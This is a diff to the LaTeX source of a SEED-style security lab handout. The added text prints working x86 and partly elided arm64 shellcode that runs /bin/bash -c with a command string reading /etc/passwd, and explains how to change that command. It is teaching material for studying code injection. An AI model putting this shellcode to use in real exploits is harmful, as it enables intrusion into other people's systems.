@@ -10,9 +10,86 @@ executed using the target program's privilege.
 Shellcode is widely used in most code-injection attacks.
 Let us get familiar with it in this task.
 
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\input{\commonfolder/guidelines/shellcode.tex}
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+Shellcode is typically used in code injection attacks.
+It is basically a piece of code that launches a shell, and
+is usually written in assembly languages.
+In this lab, we only provide the binary version of a generic shellcode,
+without explaining how it works, because it is non-trivial.
+If you are interested in how exactly shellcode works, and
+want to write a shellcode from scratch, you
+can learn that from a separate SEED lab called \textit{Shellcode Lab}.
+Our generic shellcode is listed in the following.
+\ifdefined\arm
+\else
+We only list the x86 version (32-bit); the amd64 versions of shellcode
+is similar.
+\fi
+
+
+
+
+\ifdefined\arm
+% The arm64 version 
+\begin{lstlisting}[language=python]
+shellcode= (
+   "\x0b\x05\x01\x10\x0c\x04\x84\xd2\x73\x01\x0c\xcb\x29\x01\x09\x4a"
+   ... (lines omitted) ...
+   "\x94\x02\x14\xca\xe2\x03\x14\xaa\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
+   "/bin/bash*"                                                       (*@\ding{202}@*)
+   "-c****"                                                           (*@\ding{203}@*)
+   "/bin/ls -l; echo Hello 64; /bin/tail -n 4 /etc/passwd          *" (*@\ding{204}@*)
+   # The * in this line serves as the position marker              *
+   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
+   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
+\end{lstlisting}
+
+\else
+% The x86 version 
+\begin{lstlisting}[language=python]
+shellcode = (
+   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
+   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
+   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
+   "/bin/bash*"                                                     (*@\ding{202}@*)
+   "-c*"                                                            (*@\ding{203}@*)
+   "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd        *"    (*@\ding{204}@*)
+   # The * in this line serves as the position marker         *
+   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCC"   # Placeholder for argv[2] --> the command string
+   "DDDD"   # Placeholder for argv[3] --> NULL
+).encode('latin-1')
+\end{lstlisting}
+\fi
+
+
+The shellcode runs the \texttt{"/bin/bash"} shell program (Line~\ding{202}),
+but it is given two arguments, \texttt{"-c"} (Line~\ding{203}) and
+a command string (Line~\ding{204}). This indicates that the shell program
+will run the commands in the second argument.
+The \texttt{*} at the end of these strings is only a placeholder,
+and it will be replaced by
+one byte of \texttt{0x00} during the execution of the shellcode.
+Each string needs to have a zero at the end, but we cannot put
+zeros in the shellcode. Instead, we put a placeholder at the end of each string,
+and then dynamically put a zero in the placeholder during the
+execution.
+
+If we want the shellcode to run some other commands,
+we just need to modify the command string in Line~\ding{204}.
+However, when making changes, we need to
+make sure not to change the length of this string, because the
+starting position of the placeholder for the \texttt{argv[]} array,
+which is right after the command string,
+is hardcoded in the binary portion of the shellcode. If
+we change the length, we need to modify the binary part.
+To keep the star at the end of this string at the same position,
+you can add or delete spaces.
+
 
 
 \ifdefined\arm
